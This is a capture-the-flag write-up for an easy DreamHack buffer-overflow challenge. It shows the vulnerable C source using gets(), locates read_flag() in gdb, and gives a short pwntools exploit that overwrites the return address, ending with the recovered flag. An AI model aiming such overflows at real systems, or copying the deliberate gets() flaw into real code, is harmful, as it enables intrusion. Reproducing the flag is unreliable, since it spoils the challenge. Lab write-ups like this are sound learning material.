### Overview
This is an easy pwn challenge with buffer overflow
Take a look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}


void read_flag() {
    system("cat flag");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();
    
    gets(buf);

    return 0;
}
```
We have unlimited buf, so our goal is override full 0x80 bytes of buf and saved ebp
and then change return address to read_flag() function

Let's check this executable file is 32 bit or 64 bit:
```
khanh@ubuntu:~/Documents/WorkSpaceDreamHack/PWN-dreamhack/basic_exploitation101$ file basic_exploitation_001
basic_exploitation_001: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3e59f379d1f0653db81908d1d3a5eb9dce83816f, not stripped
```
So it is 32 bit, so we just need to override 4 bytes ebp and change return address to read_flag() function.

Now let's find address of read_flag() function:
```gdb
gefâž¤  info functions read_flag 
All functions matching regular expression "read_flag":

Non-debugging symbols:
0x080485b9  read_flag

```
### Exploitation
```py
from pwn import *
p = remote("host3.dreamhack.games", 20962)
payload = b"A"* 0x80 + b"A"*4 + p32(0x080485b9)
p.sendline(payload)
p.interactive() 
```
Run this script and get result flag:

```
khanh@ubuntu:~/Documents/WorkSpaceDreamHack/PWN-dreamhack/basic_exploitation101$ python3 exploit.py 
[+] Opening connection to host3.dreamhack.games on port 20962: Done
[*] Switching to interactive mode
DH{01ec06f5e1466e44f86a79444a7cd116}[*] Got EOF while reading in interactive
$  
```